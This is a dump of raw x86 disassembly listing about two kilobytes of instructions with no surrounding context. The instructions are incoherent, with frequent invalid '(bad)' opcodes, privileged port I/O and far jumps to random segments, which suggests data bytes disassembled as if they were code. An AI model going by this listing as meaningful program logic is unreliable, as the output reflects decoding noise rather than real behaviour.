  417596:	adc    BYTE PTR [ebx+eax*4-0x64b60947],bh
  41759d:	ins    BYTE PTR es:[edi],dx
  41759e:	sub    BYTE PTR [edi],ah
  4175a0:	add    al,0x24
  4175a2:	test   DWORD PTR [ebx+edi*8],ebx
  4175a5:	xor    bh,BYTE PTR [ebx]
  4175a7:	(bad)  
  4175a9:	mov    ch,0x13
  4175ab:	icebp  
  4175ac:	mov    edi,edi
  4175ae:	loope  0x4175aa
  4175b0:	jmp    0x417561
  4175b2:	push   0x1620ef13
  4175b7:	push   ebx
  4175b8:	cli    
  4175b9:	sub    BYTE PTR [edx*2+0x6eeed18c],0x9e
  4175c1:	es and eax,0x6b9c8e3b
  4175c7:	or     ebp,esp
  4175c9:	add    ebp,DWORD PTR [ecx-0x5a]
  4175cc:	loopne 0x417559
  4175ce:	jnp    0x41756c
  4175d0:	xor    al,0xa0
  4175d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d3:	fistp  WORD PTR [eax+edx*4]
  4175d6:	addr16 pop ebp
  4175d8:	mov    es,WORD PTR [edi+0x20]
  4175db:	stos   DWORD PTR es:[edi],eax
  4175dc:	xchg   ebx,eax
  4175dd:	push   0xa60d1b5a
  4175e2:	aam    0xde
  4175e4:	mov    al,ds:0x63a33224
  4175e9:	mov    ebx,DWORD PTR [edx+0x6ac33387]
  4175ef:	je     0x4175bd
  4175f1:	imul   BYTE PTR [ebp-0x260802b3]
  4175f7:	sahf   
  4175f8:	jbe    0x4175e6
  4175fa:	in     al,dx
  4175fb:	(bad)  
  4175fc:	cld    
  4175fd:	mov    BYTE PTR [eax+0x1f03e9f4],0x25
  417604:	mov    BYTE PTR [esi],bh
  417606:	push   edx
  417607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417608:	add    DWORD PTR [esi-0x2d],esi
  41760b:	test   DWORD PTR [edi+0x4056da45],0xdbaba8e3
  417615:	jecxz  0x417598
  417617:	ins    DWORD PTR es:[edi],dx
  417618:	outs   dx,DWORD PTR ds:[esi]
  417619:	pop    ds
  41761a:	shl    BYTE PTR [ebp-0x2f],cl
  41761d:	and    ebx,DWORD PTR ds:0xd343cf53
  417623:	push   ebp
  417624:	inc    edx
  417625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417626:	sti    
  417627:	fs sbb eax,0xd2b66759
  41762d:	jmp    0x3ac0:0xef9315c2
  417634:	fninit 
  417636:	mov    eax,ds:0x6ff9e79e
  41763b:	fidiv  WORD PTR [edi]
  41763d:	loopne 0x417670
  41763f:	fst    DWORD PTR [edx+eiz*8]
  417642:	loop   0x417668
  417644:	cmp    al,0x8b
  417646:	sbb    DWORD PTR [esi+0x325524f1],edx
  41764c:	(bad)  
  41764e:	es ss es mov ebp,0xc50a54d7
  417656:	lds    edx,FWORD PTR [esi-0x46be6a45]
  41765c:	add    esp,DWORD PTR [ecx-0x16723793]
  417662:	fmul   st,st(6)
  417664:	ret    
  417665:	cmp    cl,BYTE PTR [ebx+ebp*8]
  417668:	mov    dl,0xa8
  41766a:	jmp    0xd8eb:0x730d0b06
  417671:	loopne 0x41763f
  417673:	jmp    0x8835453
  417678:	sbb    eax,0xce7c024b
  41767e:	pop    ds
  41767f:	mov    DWORD PTR [edx+0x17acaa9f],edi
  417685:	es leave 
  417687:	fs pop esp
  417689:	dec    ebx
  41768a:	mov    esi,0xd99dce2e
  41768f:	cmp    ch,BYTE PTR [edx-0x4ad3bb91]
  417695:	icebp  
  417696:	jmp    FWORD PTR [edx]
  417698:	and    ebp,DWORD PTR [esi+ebx*8-0x14]
  41769c:	xchg   ecx,eax
  41769d:	mov    BYTE PTR [edx-0x1a],bl
  4176a0:	cmp    al,0x2b
  4176a2:	call   0x7c79:0x38121806
  4176a9:	aaa    
  4176aa:	pop    ds
  4176ab:	pop    ss
  4176ac:	cwde   
  4176ad:	inc    eax
  4176ae:	cmp    eax,0x81923ae3
  4176b3:	add    eax,0x6b5e1e27
  4176b8:	dec    eax
  4176b9:	sahf   
  4176ba:	cmp    BYTE PTR [edx+0x7a4f2974],dh
  4176c0:	xchg   ebp,eax
  4176c1:	test   al,0x8
  4176c3:	jmp    0xba4fdc1d
  4176c8:	pop    ds
  4176c9:	imul   eax,eax,0x1c
  4176cc:	push   cs
  4176cd:	lods   al,BYTE PTR ds:[si]
  4176cf:	push   ds
  4176d0:	shl    DWORD PTR [esi-0x2a],0x83
  4176d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176d5:	mov    eax,ds:0xd4b4b441
  4176da:	pop    es
  4176db:	dec    esi
  4176dc:	adc    BYTE PTR [esi+0xd],ah
  4176df:	pop    edx
  4176e0:	cmp    eax,0x42ff4f3
  4176e5:	mov    cl,BYTE PTR ds:0x43152315
  4176eb:	inc    eax
  4176ec:	imul   esi,DWORD PTR [ecx],0xfffffff5
  4176ef:	add    al,0x74
  4176f1:	ins    BYTE PTR es:[edi],dx
  4176f2:	es mov ebx,0x2cd2b5f2
  4176f8:	aad    0xbe
  4176fa:	push   ecx
  4176fb:	cmp    al,0x63
  4176fd:	sbb    BYTE PTR [esi+esi*1],bl
  417700:	not    BYTE PTR [eax+0x7e]
  417703:	xchg   BYTE PTR [esi-0x49f4fced],dh
  417709:	jo     0x4176a4
  41770b:	pushf  
  41770c:	call   0xf7f7:0xcecbbbb6
  417713:	arpl   WORD PTR [ebx],bx
  417715:	sbb    edx,esi
  417717:	(bad)  
  417718:	stos   DWORD PTR es:[edi],eax
  417719:	nop
  41771a:	sbb    eax,0x38b1aede
  41771f:	dec    ecx
  417720:	mov    ch,0x45
  417722:	outs   dx,BYTE PTR ds:[esi]
  417723:	clc    
  417724:	(bad)  [ebp-0x28bf2ec0]
  41772a:	aam    0x5b
  41772c:	ror    bh,1
  41772e:	add    ebx,esp
  417730:	lock or al,0x18
  417733:	mov    cl,0x65
  417735:	mov    ebx,0x6041d41a
  41773a:	bound  edx,QWORD PTR [esi+0x22]
  41773d:	cdq    
  41773e:	repz inc esp
  417740:	ror    eax,cl
  417742:	lods   eax,DWORD PTR ds:[esi]
  417743:	mov    dh,0xe8
  417745:	call   0xcd27:0xbd275600
  41774c:	imul   esp,esi,0x38b13761
  417752:	in     al,0x82
  417754:	test   al,0x6e
  417756:	rol    DWORD PTR [edx],1
  417758:	xchg   BYTE PTR [edx+eiz*1+0x77],dh
  41775c:	sub    edi,DWORD PTR [esi-0x2e40b11b]
  417762:	leave  
  417763:	xchg   ecx,eax
  417764:	pop    edi
  417765:	cdq    
  417766:	add    bl,bl
  417768:	outs   dx,BYTE PTR ds:[esi]
  417769:	out    dx,eax
  41776a:	add    DWORD PTR [esi-0x55],0x59
  41776e:	call   0xb97f80f1
  417773:	pop    ss
  417774:	jnp    0x417759
  417776:	clc    
  417777:	cmp    DWORD PTR ds:0x8169e8c0,edx
  41777d:	dec    DWORD PTR [eax-0x27]
  417780:	cld    
  417781:	enter  0x1b7a,0xd0
  417785:	pushf  
  417786:	pop    es
  417787:	js     0x4177fa
  417789:	dec    ebx
  41778a:	xor    ecx,ecx
  41778c:	sub    DWORD PTR [eax+0x5fa0b764],edi
  417792:	test   eax,0x823c989
  417797:	pop    esi
  417798:	test   BYTE PTR [edx],bl
  41779a:	outs   dx,DWORD PTR ds:[esi]
  41779b:	xchg   ecx,eax
  41779c:	neg    BYTE PTR [eax-0x6f538ac2]
  4177a2:	mov    ds:0xa97fe5fa,eax
  4177a7:	test   BYTE PTR [ebx+0x2c],bl
  4177aa:	inc    esp
  4177ab:	xchg   ebx,eax
  4177ac:	and    eax,0xb769118
  4177b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b2:	sbb    BYTE PTR [edi+0x6ea515fd],dh
  4177b8:	call   0x7f576729
  4177bd:	bound  ebp,QWORD PTR [eax+0x52606a1f]
  4177c3:	push   esi
  4177c4:	out    0xb0,eax
  4177c6:	(bad)  
  4177c7:	cmp    al,0xf1
  4177c9:	in     eax,dx
  4177ca:	pop    ebx
  4177cb:	cmp    al,0xbf
  4177cd:	bnd jae 0x4177c8
  4177d0:	pop    eax
  4177d1:	cmp    eax,0x53543292
  4177d6:	push   ebx
  4177d7:	pop    ebp
  4177d8:	mov    al,ds:0x2832929e
  4177dd:	mov    eax,ds:0x3ca3a8c
  4177e2:	iret   
  4177e3:	xor    BYTE PTR [ecx+0x1e],ah
  4177e6:	cmp    DWORD PTR [ebx+0x55],ecx
  4177e9:	cdq    
  4177ea:	mov    esi,0x8ed904a5
  4177ef:	out    0xdc,eax
  4177f1:	inc    ecx
  4177f2:	sub    DWORD PTR [edi-0x29],ebx
  4177f5:	out    0xef,eax
  4177f7:	loop   0x4177ad
  4177f9:	jne    0x41783d
  4177fb:	clc    
  4177fc:	in     al,0xdd
  4177fe:	adc    al,0x72
  417800:	and    al,0xcf
  417803:	repnz ds push ebx
  417806:	mul    DWORD PTR gs:[edi-0x6acdf5ce]
  41780d:	addr16 aaa 
  41780f:	push   edi
  417810:	fwait
  417811:	loopne 0x41780d
  417813:	or     BYTE PTR [edi-0x128eac6f],ah
  417819:	loopne 0x4177a3
  41781b:	dec    ebp
  41781c:	arpl   WORD PTR [esi],bx
  41781e:	sbb    ah,BYTE PTR [edi]
  417820:	cld    
  417821:	daa    
  417822:	push   esp
  417823:	dec    ebp
  417824:	and    edi,esp
  417826:	popa   
  417827:	adc    BYTE PTR [ebx+0x33911226],dh
  41782d:	bound  ecx,QWORD PTR [esi]
  41782f:	and    ebx,ebp
  417831:	(bad)  
  417832:	mov    ds:0xbb4cb695,al
  417837:	jns    0x417851
  417839:	enter  0xc8bc,0x6f
  41783d:	stc    
  41783e:	mov    ds:0xaa28232d,eax
  417843:	icebp  
  417844:	cmp    BYTE PTR [esi-0x65],dl
  417847:	jo     0x4177f7
  417849:	add    BYTE PTR [ebx-0x650d4b70],al
  41784f:	mov    ds:0xdc0ffb8a,al
  417854:	xor    BYTE PTR [ebp+eax*1-0x6aaec537],dl
  41785b:	sbb    edi,esi
  41785d:	(bad)  
  417860:	imul   ebp,DWORD PTR [ebp-0x4bd9815a],0x950c19c1
  41786a:	imul   ebp,DWORD PTR ds:0xe4fe4966,0xffffffe0
  417871:	push   ebx
  417872:	adc    ebx,DWORD PTR [edx-0x62]
  417875:	push   esp
  417876:	pop    edi
  417877:	jecxz  0x4178da
  417879:	mov    al,0x84
  41787b:	sbb    DWORD PTR [eax],edx
  41787d:	dec    eax
  41787e:	jo     0x4178b8
  417880:	cmp    dl,ah
  417882:	mov    ecx,esp
  417884:	push   esp
  417885:	stos   BYTE PTR es:[edi],al
  417886:	jb     0x417887
  417888:	arpl   WORD PTR [esi],bx
  41788a:	mov    ch,0x17
  41788c:	repnz or eax,0x2c5b201e
  417892:	xchg   DWORD PTR [ebp+edx*8-0x4b7a5029],esp
  417899:	mov    al,0x70
  41789b:	pop    ds
  41789c:	pop    edx
  41789d:	enter  0xc914,0x5f
  4178a1:	ds cdq 
  4178a3:	push   0xffffffb2
  4178a5:	les    ecx,FWORD PTR [ebp-0x365520b4]
  4178ab:	std    
  4178ac:	loop   0x41792b
  4178ae:	cmp    ax,0xccf4
  4178b2:	(bad)  
  4178b3:	fist   WORD PTR [ebx]
  4178b5:	inc    DWORD PTR [ebp-0x31]
  4178b8:	rcr    BYTE PTR [ebx],0xdb
  4178bb:	repz mov edx,0xc03b2d0c
  4178c1:	ins    BYTE PTR es:[edi],dx
  4178c2:	cwde   
  4178c3:	popf   
  4178c4:	pop    ds
  4178c5:	sbb    DWORD PTR [edx+0x1a6ffe13],eax
  4178cb:	jge    0x41794c
  4178cd:	test   bh,cl
  4178cf:	stc    
  4178d0:	mov    edi,0xe5c07a6d
  4178d5:	icebp  
  4178d6:	mov    ecx,0x9ddb7a5e
  4178db:	in     al,0x38
  4178dd:	sbb    eax,DWORD PTR [edi-0x74c81b1d]
  4178e3:	xor    dh,dl
  4178e5:	inc    esi
  4178e6:	jmp    0xdc14:0x9a364da5
  4178ed:	inc    esi
  4178ee:	int    0x33
  4178f0:	in     al,dx
  4178f1:	dec    edx
  4178f2:	mov    cl,0x26
  4178f4:	lea    ecx,[eax+0x4f3fac31]
  4178fa:	cmp    edi,eax
  4178fc:	xor    DWORD PTR [ecx],ebp
  4178fe:	inc    ebp
  4178ff:	hlt    
  417900:	push   es
  417901:	dec    esp
  417902:	in     eax,dx
  417903:	pushf  
  417904:	out    0xb6,eax
  417906:	pushf  
  417907:	push   ds
  417908:	popa   
  417909:	mov    dl,0xea
  41790b:	data16 jbe 0x4178f1
  41790e:	retf   0x86be
  417911:	int    0x81
  417913:	(bad)  
  417914:	push   ecx
  417915:	lods   eax,DWORD PTR ds:[esi]
  417916:	push   0xc2ef5668
  41791b:	call   0x947100ad
  417920:	dec    ebp
  417921:	mov    ds:0x249f7440,al
  417926:	and    eax,DWORD PTR [edi]
  417928:	dec    esp
  417929:	xor    al,0xba
  41792b:	inc    esp
  41792c:	push   0x18
  41792e:	jno    0x417942
  417930:	daa    
  417931:	push   eax
  417932:	push   esp
  417933:	add    BYTE PTR [edx+0x1465d27b],al
  417939:	sub    BYTE PTR ss:[edx+eax*4],bl
  41793d:	xchg   esp,eax
  41793e:	cld    
  41793f:	mov    DWORD PTR ds:[ecx],edx
  417942:	inc    eax
  417943:	gs ret 0x704a
  417947:	push   ebx
  417948:	idiv   DWORD PTR [ebx]
  41794a:	jo     0x417964
  41794c:	test   eax,0x6284c185
  417951:	clc    
  417952:	arpl   WORD PTR ds:0x4852039e,si
  417958:	or     al,0x56
  41795a:	push   edx
  41795b:	push   cs
  41795c:	sbb    eax,0x14a391fa
  417961:	dec    edx
  417962:	adc    edx,DWORD PTR [edx]
  417964:	ins    DWORD PTR es:[edi],dx
  417965:	inc    ebx
  417966:	fnsave [edi+0x7b]
  417969:	xchg   esp,eax
  41796a:	gs inc ebp
  41796c:	ins    BYTE PTR es:[edi],dx
  41796d:	cmp    al,0xc8
  41796f:	shr    BYTE PTR [ebp-0x24],1
  417972:	push   es
  417973:	dec    edi
  417974:	add    eax,0x678441b9
  417979:	xor    eax,0xfeb86395
  41797e:	jae    0x417934
  417980:	sar    BYTE PTR [eax-0x6769ed75],cl
  417986:	loopne 0x4179e7
  417988:	adc    DWORD PTR [esi],ebp
  41798a:	call   0x1f79:0xc6627d2d
  417991:	arpl   WORD PTR [edi+0x23],bp
  417994:	ins    DWORD PTR es:[edi],dx
  417995:	adc    esi,esi
  417997:	push   eax
  417998:	xchg   esi,eax
  417999:	push   ecx
  41799a:	and    al,0x2d
  41799c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41799d:	or     BYTE PTR [edi+0x5d8b54d4],dl
  4179a3:	ins    DWORD PTR es:[edi],dx
  4179a4:	(bad)
  4179a7:	popa   
  4179a8:	repnz jecxz 0x4179f9
  4179ab:	mov    ah,0xa3
  4179ad:	mov    ebx,0xbd32e0c7
  4179b2:	cld    
  4179b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179b4:	xchg   ebx,eax
  4179b5:	ja     0x4179b3
  4179b7:	int    0x95
  4179b9:	and    eax,0xd042246b
  4179be:	inc    ecx
  4179bf:	loop   0x41795a
  4179c1:	pushf  
  4179c2:	hlt    
  4179c3:	mov    ecx,0x8477ee19
  4179c8:	mov    ds:0x22aada9,al
  4179cd:	mov    al,0x73
  4179cf:	fldenv [edx-0x18a7f611]
  4179d5:	ja     0x417a40
  4179d7:	push   ecx
  4179d8:	push   ss
  4179d9:	std    
  4179da:	sbb    eax,0x181e32ca
  4179df:	call   DWORD PTR [edx]
  4179e1:	aas    
  4179e2:	daa    
  4179e3:	mov    DWORD PTR [esi],esp
  4179e5:	cmovge ebp,eax
  4179e8:	push   es
  4179e9:	mov    bh,0xe8
  4179eb:	loope  0x4179ac
  4179ed:	fcom   DWORD PTR [esi+0x3c]
  4179f0:	cmp    DWORD PTR [ecx-0x17fddb4a],edx
  4179f6:	mov    dh,0xdd
  4179f8:	cli    
  4179f9:	sahf   
  4179fa:	(bad)  
  4179fb:	rcr    DWORD PTR ds:0x8cc33889,cl
  417a01:	mov    ah,0xdc
  417a03:	nop
  417a04:	jne    0x41798c
  417a06:	les    ebp,FWORD PTR [ecx+eiz*4]
  417a09:	loop   0x417993
  417a0b:	das    
  417a0c:	lods   eax,DWORD PTR ds:[esi]
  417a0d:	inc    esp
  417a0e:	retf   0xe144
  417a11:	xor    BYTE PTR [ebp-0x46],bh
  417a14:	pop    ebx
  417a15:	cdq    
  417a16:	inc    ecx
  417a17:	sbb    al,0x69
  417a19:	aaa    
  417a1a:	jg     0x4179fe
  417a1c:	popa   
  417a1d:	mov    ebx,0xf896a4e
  417a22:	jmp    0x6c62a722
  417a27:	cwde   
  417a28:	pop    ecx
  417a29:	sub    al,0x5c
  417a2b:	cwde   
  417a2c:	jmp    0xda4a84c8
  417a31:	popf   
  417a32:	add    al,0x4d
  417a34:	stos   BYTE PTR es:[edi],al
  417a35:	sub    dh,0x7b
  417a38:	outs   dx,DWORD PTR ds:[esi]
  417a39:	(bad)  
  417a3a:	repnz test al,0x9c
  417a3d:	hlt    
  417a3e:	xlat   BYTE PTR ds:[ebx]
  417a3f:	xor    eax,0xddb11683
  417a44:	mov    WORD PTR [ecx+0x24],ds
  417a47:	sub    esp,DWORD PTR [eax-0x13]
  417a4a:	add    ebp,edi
  417a4c:	mov    gs,WORD PTR [ebp+0x1c49d7e6]
  417a52:	out    0x6a,al
  417a54:	and    bh,BYTE PTR [eax]
  417a56:	arpl   WORD PTR [ecx+0x27],cx
  417a59:	dec    esp
  417a5a:	fs xchg ebx,eax
  417a5c:	ins    DWORD PTR es:[edi],dx
  417a5d:	popf   
  417a5e:	out    dx,eax
  417a5f:	and    dh,BYTE PTR [ebx]
  417a61:	pushf  
  417a62:	and    al,0xb6
  417a64:	adc    eax,0xe17eebbf
  417a69:	cmp    DWORD PTR [edi-0x19],edi
  417a6c:	test   BYTE PTR [edi-0x12],0xba
  417a70:	sti    
  417a71:	pop    ebp
  417a72:	jg     0x417a9a
  417a74:	pusha  
  417a75:	sbb    al,0x53
  417a77:	cmp    DWORD PTR [ecx-0xba972d7],ecx
  417a7d:	add    al,0x9f
  417a7f:	nop
  417a80:	out    0x6,al
  417a82:	sbb    esp,DWORD PTR [ebp+esi*2-0x56]
  417a86:	loopne 0x417a9e
  417a88:	(bad)  
  417a89:	xor    ebp,DWORD PTR [edx]
  417a8b:	xor    dh,BYTE PTR [ebp+0x34a924af]
  417a91:	dec    esp
  417a92:	adc    BYTE PTR [edi],dl
  417a94:	stos   BYTE PTR es:[edi],al
  417a95:	cwde   
  417a96:	mov    ds:0xc73608cd,al
  417a9b:	sbb    ecx,DWORD PTR [eax+0x21]
  417a9e:	pop    esi
  417a9f:	inc    esp
  417aa0:	test   eax,0x949960aa
  417aa5:	out    0xb3,al
  417aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa8:	aam    0x21
  417aaa:	lods   al,BYTE PTR ds:[esi]
  417aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aac:	mov    ebp,0xdb9a85a
  417ab1:	dec    ebx
  417ab2:	jmp    0x40388c55
  417ab7:	add    DWORD PTR [esi+0x41],ebx
  417aba:	or     esi,eax
  417abc:	ins    BYTE PTR es:[edi],dx
  417abd:	mov    ds:0x1b0a7ec5,eax
  417ac2:	sbb    al,0x53
  417ac4:	inc    edx
  417ac5:	pop    esi
  417ac6:	imul   ecx,ecx,0x1ca66e2b
  417acc:	jle    0x417b29
  417ace:	add    ah,BYTE PTR [edx+eiz*4-0x1e]
  417ad2:	mov    esp,0x6d9bb0ee
  417ad7:	in     al,dx
  417ad8:	in     al,0xed
  417ada:	mov    ch,0x9e
  417adc:	fldcw  WORD PTR [edi-0x6f]
  417adf:	rcr    DWORD PTR [ebx-0x5a],1
  417ae2:	mov    DWORD PTR [edx+0x249ddd23],eax
  417ae8:	out    0xe4,al
  417aea:	shl    DWORD PTR [edx],0x9a
  417aed:	cmp    cl,dl
  417aef:	sub    bh,BYTE PTR [esi+0x7d8bcd53]
  417af5:	retf   0x6650
  417af8:	add    al,BYTE PTR [ebp+0x36]
  417afb:	lahf   
  417afc:	int3   
  417afd:	dec    ebp
  417afe:	xor    esp,DWORD PTR [eax-0x2eed30a0]
  417b04:	pushf  
  417b05:	cwde   
  417b06:	fdivr  st,st(6)
  417b08:	inc    ebx
  417b09:	mov    ebx,0x645e0147
  417b0e:	add    al,0x13
  417b10:	push   ecx
  417b11:	cmp    esp,edi
  417b13:	sbb    eax,0xb90e8bd2
  417b18:	and    BYTE PTR [ecx+0x35],bh
  417b1b:	retf   
  417b1c:	adc    al,0x9b
  417b1e:	mov    bh,bh
  417b20:	ja     0x417aef
  417b22:	call   0xd403f7ed
  417b27:	pop    ebp
  417b28:	iret   
  417b29:	lods   al,BYTE PTR ds:[esi]
  417b2a:	push   ebp
  417b2b:	jmp    DWORD PTR [esi+ebp*2+0x62]
  417b2f:	jbe    0x417b5b
  417b31:	mov    dl,0x3b
  417b33:	pop    edi
  417b34:	adc    BYTE PTR [ecx],ch
  417b36:	(bad)  
  417b37:	enter  0xfa10,0xe5
  417b3b:	fbld   TBYTE PTR [eax-0x3c]
  417b3e:	push   ds
  417b3f:	or     al,0x76
  417b41:	(bad)  
  417b42:	push   ss
  417b43:	jb     0x417b11
  417b45:	cs xchg esp,eax
  417b47:	loopne 0x417bb1
  417b49:	retf   
  417b4a:	mov    eax,ds:0x362ffb09
  417b4f:	nop
  417b50:	cwde   
  417b51:	arpl   bp,sp
  417b53:	push   ds
  417b54:	pop    edi
  417b55:	xor    dl,BYTE PTR [esi-0x3eff4f56]
  417b5b:	cmp    ecx,DWORD PTR [esi]
  417b5d:	inc    edx
  417b5e:	push   ds
  417b5f:	cwde   
  417b60:	stc    
  417b61:	(bad)  
  417b62:	gs mov ebx,0x744804f7
  417b68:	jp     0x417b10
  417b6a:	mov    al,ah
  417b6c:	sbb    edx,ebp
  417b6e:	(bad)  
  417b70:	pop    ebp
  417b71:	cmp    DWORD PTR [esi+ecx*2],0xb00779e9
  417b78:	pop    ebp
  417b79:	outs   dx,BYTE PTR ds:[esi]
  417b7a:	rcl    DWORD PTR [ebp-0x7b0d5d4e],cl
  417b80:	mov    esi,0xbb2f15f8
  417b85:	mov    ah,BYTE PTR [ebp+0x10]
  417b88:	les    ecx,FWORD PTR [edx]
  417b8a:	xor    edi,DWORD PTR [esi]
  417b8c:	cmp    esi,ebx
  417b8e:	into   
  417b8f:	and    esi,ecx
  417b91:	test   DWORD PTR [ecx-0x3575859],eax
  417b97:	inc    ebp
  417b98:	fidiv  WORD PTR [edx]
  417b9a:	in     eax,dx
  417b9b:	scas   al,BYTE PTR es:[edi]
  417b9c:	daa    
  417b9d:	out    0xa4,eax
  417b9f:	mov    ebx,0x28d04f1f
  417ba4:	xchg   edi,eax
  417ba5:	push   esp
  417ba6:	stos   BYTE PTR es:[edi],al
  417ba7:	rol    BYTE PTR [ebp-0x79],cl
  417baa:	lods   eax,DWORD PTR ds:[esi]
  417bab:	mov    es,WORD PTR [ecx+0x1]
  417bae:	sbb    al,0xe1
  417bb0:	pusha  
  417bb1:	pusha  
  417bb2:	or     BYTE PTR [ebx],ah
  417bb4:	enter  0x7d3c,0x67
  417bb8:	jp     0x417b4b
  417bba:	fsubr  QWORD PTR [eax]
  417bbc:	xchg   esi,eax
  417bbd:	mov    ds:0x709666d7,al
  417bc2:	out    0xbe,al
  417bc4:	push   ecx
  417bc5:	or     eax,0x9723b432
  417bca:	lods   eax,DWORD PTR ds:[esi]
  417bcb:	adc    al,0xf7
  417bcd:	out    0xb3,eax
  417bcf:	mov    esp,ebp
  417bd1:	aaa    
  417bd2:	inc    ecx
  417bd3:	push   ebp
  417bd4:	js     0x417c1a
  417bd6:	lds    ecx,FWORD PTR [edi-0x3c]
  417bd9:	pop    ebp
  417bda:	cmp    eax,0x2836242a
  417bdf:	or     DWORD PTR [edx],edx
  417be1:	xlat   BYTE PTR ds:[ebx]
  417be2:	cmc    
  417be3:	test   al,0xf8
  417be5:	push   eax
  417be6:	dec    ecx
  417be7:	cs iret 
  417be9:	outs   dx,BYTE PTR ds:[esi]
  417bea:	dec    esp
  417beb:	push   ebx
  417bec:	fwait
  417bed:	daa    
  417bee:	fwait
  417bef:	and    eax,DWORD PTR [edi+0x33d49c99]
  417bf5:	push   ebx
  417bf6:	pop    ecx
  417bf7:	hlt    
  417bf8:	in     al,0xb3
  417bfa:	dec    ecx
  417bfb:	pop    eax
  417bfc:	int3   
  417bfd:	cld    
  417bfe:	imul   edi,DWORD PTR [edx-0x34],0xfffffffc
  417c02:	fldenv [ecx+esi*1+0x39]
  417c06:	xor    esi,ebx
  417c08:	les    eax,FWORD PTR [eax]
  417c0a:	xor    eax,0x870ce388
  417c0f:	sub    ah,dl
  417c11:	ret    0xb14e
  417c14:	jo     0x417bf5
  417c16:	adc    al,0x8d
  417c18:	push   0x21a7e072
  417c1d:	cld    
  417c1e:	arpl   cx,sp
  417c20:	adc    al,0x66
  417c22:	xor    DWORD PTR [ecx+edi*2+0x3f5b0842],edx
  417c29:	pop    ss
  417c2a:	mov    ebx,0x7984608d
  417c2f:	cwde   
  417c30:	pop    ss
  417c31:	in     eax,0x6
  417c33:	pop    ds
  417c34:	outs   dx,BYTE PTR ds:[esi]
  417c35:	stc    
  417c36:	scas   eax,DWORD PTR es:[edi]
  417c37:	aas    
  417c38:	dec    ecx
  417c39:	shl    BYTE PTR [ebp+0x5d940b68],1
  417c3f:	jmp    0x1428:0xd2e049e7
  417c46:	sub    ebx,esi
  417c48:	or     bl,dh
  417c4a:	sub    eax,0x2680252f
  417c4f:	mov    fs,edx
  417c51:	add    bh,BYTE PTR [ecx+0x2ca6010a]
  417c57:	pop    eax
  417c58:	push   edi
  417c59:	xlat   BYTE PTR ds:[ebx]
  417c5a:	aam    0x5c
  417c5c:	fs pop ss
  417c5e:	inc    BYTE PTR ds:0x2fdf34c1
  417c64:	loope  0x417cdd
  417c66:	je     0x417c50
  417c68:	dec    edi
  417c69:	call   0xcad1:0x80f55d39
  417c70:	sbb    DWORD PTR [ecx],edx
  417c72:	(bad)  [esi-0x54]
  417c75:	lock ds or al,0x47
  417c79:	pop    ds
  417c7a:	xchg   esp,eax
  417c7b:	data16 add ch,BYTE PTR [ecx-0x305bfedf]
  417c82:	(bad)  
  417c83:	fidivr DWORD PTR [esi-0x63cedbeb]
  417c89:	mov    ebx,0xccdf2ff
  417c8e:	push   0x67
  417c90:	fist   WORD PTR [eax-0x5de03157]
  417c96:	iret   
  417c97:	leave  
  417c98:	sbb    ebp,ebx
  417c9a:	mov    DWORD PTR [edi+0x15],esp
  417c9d:	rol    DWORD PTR [ecx-0x6c],1
  417ca0:	stos   BYTE PTR es:[edi],al
  417ca1:	sbb    ah,BYTE PTR [ebx-0x306d8b2]
  417ca7:	ss mov al,0x17
  417caa:	aaa    
  417cab:	in     al,dx
  417cac:	cdq    
  417cad:	xlat   BYTE PTR ds:[ebx]
  417cae:	lods   al,BYTE PTR ds:[esi]
  417caf:	bound  esp,QWORD PTR [edx+0x37364145]
  417cb5:	pop    ss
  417cb6:	shl    ah,cl
  417cb8:	cmp    cl,dl
  417cba:	call   0x1264:0xcb76a7ec
  417cc1:	push   edi
  417cc2:	call   0x58f1:0xf76a512e
  417cc9:	test   DWORD PTR [ebx-0x17da9401],ebx
  417ccf:	icebp  
  417cd0:	pop    ecx
  417cd1:	fisttp QWORD PTR [eax-0x5f]
  417cd4:	jmp    0x417c81
  417cd6:	out    dx,al
  417cd7:	addr16 cld 
  417cd9:	pop    esi
  417cda:	inc    eax
  417cdb:	fisub  DWORD PTR [edx+0x4cd99bd8]
  417ce1:	jge    0x417d4e
  417ce3:	stc    
  417ce4:	jnp    0x417ce2
  417ce6:	rol    DWORD PTR [edi-0x49],cl
  417ce9:	frstor [ebp-0x22]
  417cec:	push   ds
  417ced:	dec    esp
  417cee:	enter  0x4211,0xb5
  417cf2:	call   0x3bdf:0xcdd96e49
  417cf9:	mov    DWORD PTR [ebx+0x5a],esi
  417cfc:	sbb    eax,ecx
  417cfe:	xor    dh,BYTE PTR [ecx+0x79]
  417d01:	faddp  st(7),st
  417d03:	hlt    
  417d04:	mov    ecx,0xd0104a6b
  417d09:	fwait
  417d0a:	jp     0x417d34
  417d0c:	or     al,0xa3
  417d0e:	or     DWORD PTR [ecx+0x3b],eax
  417d11:	mov    edx,edx
  417d13:	sti    
  417d14:	mov    eax,0xf5c0598e
  417d19:	test   eax,0x17bd8d1
  417d1e:	(bad)  
  417d1f:	call   0x7f95ecbf
  417d24:	fldenv [edx]
  417d26:	push   esi
  417d27:	imul   edx,DWORD PTR [ebp+0x72],0xffffffef
  417d2b:	fiadd  DWORD PTR [eax]
  417d2d:	add    edi,DWORD PTR [ecx+edi*1+0x4]
  417d31:	xchg   esi,eax
  417d32:	xchg   ebp,eax
  417d33:	cld    
  417d34:	push   ds
  417d35:	hlt    
  417d36:	pushf  
  417d37:	sbb    dl,BYTE PTR [ebx+0x3545de1b]
  417d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d3f:	aaa    
  417d40:	stos   DWORD PTR es:[edi],eax
  417d41:	xor    DWORD PTR [ecx+0x78],ebp
  417d44:	ret    0x5991
  417d47:	push   es
  417d48:	sbb    ah,BYTE PTR [esp+eiz*8-0x20c36003]
  417d4f:	mov    al,ds:0xca4465ce
  417d54:	adc    DWORD PTR [eax-0x47],ebx
  417d57:	fld    QWORD PTR [ecx+esi*4+0x3c73715]
  417d5e:	fisub  WORD PTR ds:0xaeb0ba8a
  417d64:	fwait
